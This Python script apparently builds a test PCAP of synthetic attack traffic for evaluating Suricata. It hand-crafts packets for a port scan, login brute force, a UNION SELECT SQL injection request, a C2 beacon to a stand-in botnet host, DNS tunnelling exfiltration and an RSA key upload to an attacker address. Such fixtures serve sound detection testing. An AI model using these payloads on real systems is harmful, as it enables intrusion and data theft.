"""
Pure Python PCAP Generator
Creates standard Libpcap (.pcap) capture file containing raw network packets
for all 6 threat scenarios to facilitate offline replay evaluation with:
  suricata -c config/suricata/suricata.yaml -r pcaps/suricata_attack_suite.pcap
"""

import struct
import time
import os

PCAP_GLOBAL_HEADER = struct.pack(
    "<IHHiIII",
    0xa1b2c3d4,  # magic number (standard libpcap)
    2,           # major version
    4,           # minor version
    0,           # thiszone (GMT)
    0,           # sigfigs
    65535,       # snaplen
    1            # linktype (Ethernet)
)

def checksum(data: bytes) -> int:
    if len(data) % 2 == 1:
        data += b'\x00'
    s = sum(struct.unpack(f">{len(data)//2}H", data))
    s = (s >> 16) + (s & 0xffff)
    s += (s >> 16)
    return (~s) & 0xffff

def ip2bytes(ip_str: str) -> bytes:
    return bytes(map(int, ip_str.split('.')))

def build_eth_frame(src_mac: str, dst_mac: str, ip_packet: bytes) -> bytes:
    def mac2bytes(mac: str) -> bytes:
        return bytes(int(b, 16) for b in mac.split(':'))
    return mac2bytes(dst_mac) + mac2bytes(src_mac) + b'\x08\x00' + ip_packet

def build_ipv4_packet(src_ip: str, dst_ip: str, proto: int, payload: bytes) -> bytes:
    total_len = 20 + len(payload)
    hdr_without_cksum = struct.pack(
        ">BBHHHBBH4s4s",
        0x45,        # Version (4) + IHL (5)
        0x00,        # DSCP/ECN
        total_len,   # Total Length
        0x1234,      # Identification
        0x4000,      # Flags (Don't Fragment)
        64,          # TTL
        proto,       # Protocol (6=TCP, 17=UDP, 1=ICMP)
        0,           # Checksum placeholder
        ip2bytes(src_ip),
        ip2bytes(dst_ip)
    )
    cksum = checksum(hdr_without_cksum)
    hdr = struct.pack(
        ">BBHHHBBH4s4s",
        0x45, 0x00, total_len, 0x1234, 0x4000, 64, proto, cksum,
        ip2bytes(src_ip), ip2bytes(dst_ip)
    )
    return hdr + payload

def build_tcp_segment(src_port: int, dst_port: int, seq: int, ack: int, flags: int, payload: bytes, src_ip: str, dst_ip: str) -> bytes:
    offset = (5 << 4) # 5 words = 20 bytes
    tcp_hdr_no_cksum = struct.pack(
        ">HHIIBBHHH",
        src_port, dst_port, seq, ack, offset, flags, 64240, 0, 0
    )
    # Pseudo header for TCP checksum
    pseudo = struct.pack(
        ">4s4sBBH",
        ip2bytes(src_ip), ip2bytes(dst_ip), 0, 6, 20 + len(payload)
    )
    cksum = checksum(pseudo + tcp_hdr_no_cksum + payload)
    tcp_hdr = struct.pack(
        ">HHIIBBHHH",
        src_port, dst_port, seq, ack, offset, flags, 64240, cksum, 0
    )
    return tcp_hdr + payload

def build_pcap_record(ts: float, frame_data: bytes) -> bytes:
    sec = int(ts)
    usec = int((ts - sec) * 1000000)
    length = len(frame_data)
    hdr = struct.pack("<IIII", sec, usec, length, length)
    return hdr + frame_data

def generate_attack_pcap(output_path: str):
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    base_ts = time.time() - 3600 # 1 hour ago
    records = []

    src_mac = "00:0c:29:ab:cd:ef"
    dst_mac = "00:50:56:12:34:56"

    # Attack 1: Port Scan SYN Packets
    attacker_recon_ip = "198.51.100.42"
    target_ip = "10.0.0.80"
    for port in [21, 22, 23, 25, 80, 443, 1433, 3306, 3389, 8080]:
        base_ts += 0.05
        tcp_seg = build_tcp_segment(40000 + port, port, 1000, 0, 0x02, b'', attacker_recon_ip, target_ip) # SYN
        ip_pkt = build_ipv4_packet(attacker_recon_ip, target_ip, 6, tcp_seg)
        frame = build_eth_frame(src_mac, dst_mac, ip_pkt)
        records.append(build_pcap_record(base_ts, frame))

    # Attack 2: HTTP Login Brute Force (HTTP 401s)
    attacker_auth_ip = "203.0.113.88"
    for i in range(5):
        base_ts += 0.2
        http_req = (
            f"POST /login HTTP/1.1\r\nHost: target.corp.local\r\nUser-Agent: Mozilla/5.0 (Hydra-Tool)\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: 26\r\n\r\n"
            f"username=admin&password=guess{i}"
        ).encode()
        tcp_seg = build_tcp_segment(52100 + i, 80, 2000, 1000, 0x18, http_req, attacker_auth_ip, target_ip) # PSH+ACK
        ip_pkt = build_ipv4_packet(attacker_auth_ip, target_ip, 6, tcp_seg)
        records.append(build_pcap_record(base_ts, build_eth_frame(src_mac, dst_mac, ip_pkt)))

    # Attack 3: Web SQL Injection
    attacker_web_ip = "192.0.2.140"
    base_ts += 0.5
    sqli_req = (
        "GET /search?q=1%27%20UNION%20SELECT%20null,username,password%20FROM%20users-- HTTP/1.1\r\n"
        "Host: target.corp.local\r\nUser-Agent: sqlmap/1.7#dev\r\n\r\n"
    ).encode()
    tcp_seg = build_tcp_segment(53100, 80, 3000, 1000, 0x18, sqli_req, attacker_web_ip, target_ip)
    records.append(build_pcap_record(base_ts, build_eth_frame(src_mac, dst_mac, build_ipv4_packet(attacker_web_ip, target_ip, 6, tcp_seg))))

    # Attack 4: Malware C2 Heartbeat Beacon
    c2_ip = "198.51.100.200"
    base_ts += 0.5
    c2_req = (
        "POST /api/v1/heartbeat HTTP/1.1\r\nHost: c2.botnet.threat\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\n"
        "beacon_id=BOTNET-77&cmd=POLL&ack=1"
    ).encode()
    tcp_seg = build_tcp_segment(54100, 80, 4000, 1000, 0x18, c2_req, target_ip, c2_ip)
    records.append(build_pcap_record(base_ts, build_eth_frame(src_mac, dst_mac, build_ipv4_packet(target_ip, c2_ip, 6, tcp_seg))))

    # Attack 5: DNS Data Exfiltration / Tunneling (UDP 53)
    exfil_dns_ip = "192.0.2.99"
    base_ts += 0.4
    fake_domain = "aW50ZXJuYWxfaXBfbWFwOjEwLjAuMC4xLDEwLjAuMC4y.tunnel.exfiltration.threat.internal"
    # DNS Query payload
    dns_query = bytearray()
    dns_query.extend(b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00')
    for part in fake_domain.split('.'):
        dns_query.append(len(part))
        dns_query.extend(part.encode())
    dns_query.append(0)
    dns_query.extend(b'\x00\x01\x00\x01')
    
    udp_hdr = struct.pack(">HHHH", 55200, 53, 8 + len(dns_query), 0)
    ip_udp = build_ipv4_packet(exfil_dns_ip, "8.8.8.8", 17, udp_hdr + bytes(dns_query))
    records.append(build_pcap_record(base_ts, build_eth_frame(src_mac, dst_mac, ip_udp)))

    # Attack 6: Sensitive RSA Key Exfiltration
    attacker_exfil_ip = "203.0.113.111"
    base_ts += 0.5
    rsa_payload = (
        "POST /upload?file=id_rsa HTTP/1.1\r\nHost: target.corp.local\r\n\r\n"
        "-----BEGIN RSA PRIVATE KEY-----\n"
        "MIIEowIBAAKCAQEA0Y3wVq28h9c8w0t7yF2x9J7qL8m2k5v9w3x7y8z9a0b1c2d3\n"
        "-----END RSA PRIVATE KEY-----\n"
    ).encode()
    tcp_seg = build_tcp_segment(56100, 80, 5000, 1000, 0x18, rsa_payload, target_ip, attacker_exfil_ip)
    records.append(build_pcap_record(base_ts, build_eth_frame(src_mac, dst_mac, build_ipv4_packet(target_ip, attacker_exfil_ip, 6, tcp_seg))))

    with open(output_path, "wb") as f:
        f.write(PCAP_GLOBAL_HEADER)
        for rec in records:
            f.write(rec)

    print(f"[OK] Generated standard PCAP capture ({len(records)} packets) at: {output_path}")

if __name__ == "__main__":
    pcap_file = os.path.join(os.path.dirname(__file__), "pcaps", "suricata_attack_suite.pcap")
    generate_attack_pcap(pcap_file)
